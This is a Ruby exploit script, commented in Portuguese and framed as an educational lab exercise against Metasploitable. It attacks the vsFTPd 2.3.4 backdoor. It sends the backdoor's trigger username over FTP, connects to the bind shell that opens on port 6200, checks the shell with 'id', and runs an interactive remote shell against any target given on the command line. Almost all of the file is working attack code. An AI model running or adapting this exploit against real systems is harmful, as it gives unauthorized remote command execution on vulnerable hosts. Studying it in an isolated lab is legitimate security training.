#!/usr/bin/env ruby

# vsftpd_simple.rb
# Autor: llRods

########################################################
# Aviso! Este script foi feito para fins educacionais. #
# Execute apenas em ambientes isolados e controlados,  #
# ou com autorização explícita para tal.               #
########################################################

# Ambiente: VirtualBox (Host-Only), Kali Linux (atacante) e Metasploitable (alvo).
# Escopo: Somente máquinas próprias/VMs para fins educativos.
# Objetivo: Explorar o backdoor do serviço vsFTPd 2.3.4,
# obter acesso à um shell remoto e ler o arquivo /home/msfadmin/flag.txt

# Uso: ruby vsftpd_simple.rb <TARGET> [ftp_port=21] [backdoor_port=6200]

require 'socket'

if ARGV.empty?
    puts "Uso: #{$PROGRAM_NAME} <TARGET> [ftp_port=21] [backdoor_port=6200]"
    exit 1
end

target = ARGV[0]
ftp_port = (ARGV[1] || 21).to_i
backdoor_port = (ARGV[2] || 6200).to_i

def try_connect(host, port)
    begin
        TCPSocket.new(host, port)
    rescue
        nil
    end
end

puts "[*] alvo=#{target} ftp=#{ftp_port} backdoor=#{backdoor_port}"

# 1) já existe bind shell?
s = try_connect(target, backdoor_port)
if s
    puts "[*] já tinha serviço em #{backdoor_port}, usando..."
else
    # 2) conectar no FTP e acionar : )
    ftp = try_connect(target, ftp_port)
    unless ftp
        puts "[!] não consegui conectar em #{target}:#{ftp_port}"
        exit 1
    end

    # tentar ler banner (não obrigatório), ignoramos exceções
    begin
        banner = ftp.gets
        puts "[*] banner: #{banner.strip}" if banner
    rescue
        # Ignora
    end

    # envia USER com gatilho
    begin
        ftp.puts 'USER exploit:)'
        resp = ftp.gets
        puts "[*] resposta USER: #{resp.strip}" if resp

        if resp =~ /^530 /
            puts '[!] Servidor configurado anonymous-only (530). Backdoor não pode ser alcançado via este caminho.'
            ftp.close rescue nil
            exit 1
        end

        if resp !~ /^331 /
            puts "[!] Resposta inesperada ao USER: #{resp.strip}"
            ftp.close rescue nil
            exit 1
        end

        ftp.puts 'PASS x'
    rescue => e
        puts "[!] erro ao falar com FTP: #{e}"
        ftp.close rescue nil
        exit 1
    ensure
        ftp.close rescue nil
    end

    # Tenta o bind shell
    puts '[*] Aguarde, tentando conectar no backdoor...'
    tries = 10
    tries.times do
        s = try_connect(target, backdoor_port)
        break if s

        sleep 0.4
    end

    unless s
        puts "[!] Backdoor não apareceu na porta #{backdoor_port}."
        exit 1
    end

    puts "[*] conectado ao backdoor em #{backdoor_port}"
end

# 3) validar que realmente temos uma shell simples (envia 'id')
begin
    s.puts "id\n"
    resp = s.gets
    if resp =~ /uid=/
        puts "[+] Shell detectada: #{resp.strip}"
    else
        puts "[!] Não parece ser uma shell (resposta: #{resp.inspect}). Prosseguindo com cautela..."
        exit 1
    end
rescue => e
    puts "[!] Erro ao validar shell: #{e}"
end

# 4) sessão interativa simples (reader thread + loop de escrita)
reader = Thread.new do
    begin
        loop do
            data = s.recv(4096)
            break if data.nil? || data.empty?

            print data
        end
    rescue => e
        $stderr.puts "[!] reader thread erro: #{e}"
    end
end

begin
    while line = $stdin.gets
        s.write(line)
    end
rescue Interrupt
    # Ctrl-C para sair
ensure
    s.close rescue nil
    reader.join(1)
    puts "\n[*] sessao encerrada"
end
